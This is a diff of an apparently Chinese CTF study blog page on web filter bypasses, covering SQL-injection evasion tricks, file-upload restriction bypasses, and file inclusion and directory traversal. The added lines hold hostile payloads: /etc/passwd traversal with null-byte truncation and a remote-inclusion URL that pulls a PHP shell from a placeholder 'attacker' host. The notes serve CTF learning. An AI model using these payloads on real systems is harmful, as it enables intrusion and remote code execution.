@@ -23,7 +23,7 @@
 <meta property="og:site_name" content="啦啦菌NODE">
 <meta property="og:description" content="—  从零开始的笔记  —— sql，上传，目录  —">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2017-11-23T10:46:10.281Z">
+<meta property="og:updated_time" content="2017-11-23T13:10:48.073Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="WEB-CTF中的绕过">
 <meta name="twitter:description" content="—  从零开始的笔记  —— sql，上传，目录  —">
@@ -315,7 +315,11 @@
 <hr>
 <h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><ul>
 <li>url base64 utf-8… (全部编码或个别编码)</li>
-<li>字符–&gt;char()  如：Test  –&gt; CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。<h3 id="重复"><a href="#重复" class="headerlink" title="重复"></a>重复</h3>admin  —&gt;  adadminmin<br>admin  —&gt;  adminadmin<h3 id="大小写混用"><a href="#大小写混用" class="headerlink" title="大小写混用"></a>大小写混用</h3>SeLeT   不多解释<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3></li>
+<li>字符–&gt;char()  如：Test  –&gt; CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</li>
+</ul>
+<h3 id="重复"><a href="#重复" class="headerlink" title="重复"></a>重复</h3><p>admin  —&gt;  adadminmin<br>admin  —&gt;  adminadmin</p>
+<h3 id="大小写混用"><a href="#大小写混用" class="headerlink" title="大小写混用"></a>大小写混用</h3><p>SeLeT   不多解释</p>
+<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><ul>
 <li>两个空格代替一个空格，TAB代替空格</li>
 <li>用注释符号代替空格 /**/</li>
 <li>用括号代替空格 </li>
@@ -353,13 +357,19 @@
 <li>@@user ==&gt; user()</li>
 <li>@@datadir ==&gt; datadir()</li>
 </ul>
-<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>当服务器会自动加上.php<br>“.”  “%00” —&gt; ull的url编码<br><code>?file=a.doc..php</code><br><code>?file=a.doc%00.php</code>   </p>
-<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>加特殊字符  </p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>随便提几个基础的：</p>
 <ul>
-<li>空格 &lt; &gt;  </li>
-<li>././././  </li>
-<li>pjpjp(不存在目录)/../</li>
+<li>文件名限制      1.php.jpeg 可以在服务端使用php格式打开执行</li>
+<li>文件类型限制     burpsuite 修改image/jpeg</li>
+<li>文件大小限制     修改信息文件限制大小参数</li>
+<li>文件内容头部     修改文件内容头部<br>高端的，直接上<a href="http://blog.0kami.cn/2016/07/04/file-upload-vulnerability/" target="_blank" rel="external">0kami的博客</a> </li>
 </ul>
+<h2 id="文件包含及目录遍历"><a href="#文件包含及目录遍历" class="headerlink" title="文件包含及目录遍历"></a>文件包含及目录遍历</h2><p>两者应用相似，唯一不同就在于：前者是在url的<strong>参数</strong>中，后者是直接在url上</p>
+<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>– 0字节 \x00<br>(magic_quotes_gpc=off PHP小于5.3.4)<br><code>../../../../../../etc/passwd%00</code></p>
+<h3 id="长目录截断"><a href="#长目录截断" class="headerlink" title="长目录截断"></a>长目录截断</h3><p>利用操作系统对目录最大长度的限制<br>(php版本小于5.2.8(?) linux&gt;4096 windows&gt;256)<br><code>././././././././././././././././passwd</code><br><code>////////////////////////passwd</code></p>
+<h3 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h3><p>(php版本小于5.2.8(?) 只适用windows 最后点号&gt;256)<br><code>?file=../../../../../../../../../boot.ini/………[…]…………</code></p>
+<h3 id="远程文件包含中的"><a href="#远程文件包含中的" class="headerlink" title="远程文件包含中的?"></a>远程文件包含中的<strong>?</strong></h3><p>远程文件包含本身参数传递的就是url地址，末尾加个<strong>？</strong>会把之后的系统后台添加的字符串理解为无用参数<br><code>/?param=http://attacker/phpshell.txt?</code><br><code>require_once &#39;http://attacker/phpshell.txt?/action/m_share.php&#39;;</code></p>
+<p>以上偷取葛大佬的部分栗子</p>
 
       
     </div>
@@ -371,7 +381,7 @@
         <p><span>本文标题:</span><a href="/2017/10/19/WEB-CTF中的绕过/">WEB-CTF中的绕过</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">LaLa</a></p>
         <p><span>发布时间:</span>2017-10-19, 16:51:11</p>
-        <p><span>最后更新:</span>2017-11-23, 18:46:10</p>
+        <p><span>最后更新:</span>2017-11-23, 21:10:48</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2017/10/19/WEB-CTF中的绕过/" title="WEB-CTF中的绕过">http://lalajun.com/2017/10/19/WEB-CTF中的绕过/</a>
             <span class="copy-path" data-clipboard-text="原文: http://lalajun.com/2017/10/19/WEB-CTF中的绕过/　　作者: LaLa" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -401,7 +411,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入"><span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#编码"><span class="toc-text">编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#重复"><span class="toc-text">重复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#大小写混用"><span class="toc-text">大小写混用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤空格"><span class="toc-text">过滤空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤"><span class="toc-text">过滤=</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql条件注释的利用-…"><span class="toc-text">Mysql条件注释的利用  /! … /</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤逗号"><span class="toc-text">过滤逗号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤引号"><span class="toc-text">过滤引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤-lt-与-gt"><span class="toc-text">过滤<与></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤sleep"><span class="toc-text">过滤sleep</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤注释符号（-，–）"><span class="toc-text">过滤注释符号（#，–）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤单引号"><span class="toc-text">过滤单引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用等价函数"><span class="toc-text">利用等价函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传"><span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#目录遍历"><span class="toc-text">目录遍历</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入"><span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#编码"><span class="toc-text">编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#重复"><span class="toc-text">重复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#大小写混用"><span class="toc-text">大小写混用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤空格"><span class="toc-text">过滤空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤"><span class="toc-text">过滤=</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql条件注释的利用-…"><span class="toc-text">Mysql条件注释的利用  /! … /</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤逗号"><span class="toc-text">过滤逗号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤引号"><span class="toc-text">过滤引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤-lt-与-gt"><span class="toc-text">过滤<与></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤sleep"><span class="toc-text">过滤sleep</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤注释符号（-，–）"><span class="toc-text">过滤注释符号（#，–）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤单引号"><span class="toc-text">过滤单引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用等价函数"><span class="toc-text">利用等价函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传"><span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件包含及目录遍历"><span class="toc-text">文件包含及目录遍历</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#00截断"><span class="toc-text">%00截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#长目录截断"><span class="toc-text">长目录截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#点号截断"><span class="toc-text">点号截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程文件包含中的"><span class="toc-text">远程文件包含中的?</span></a></li></ol></li></ol>
         
     </div>
     <style>
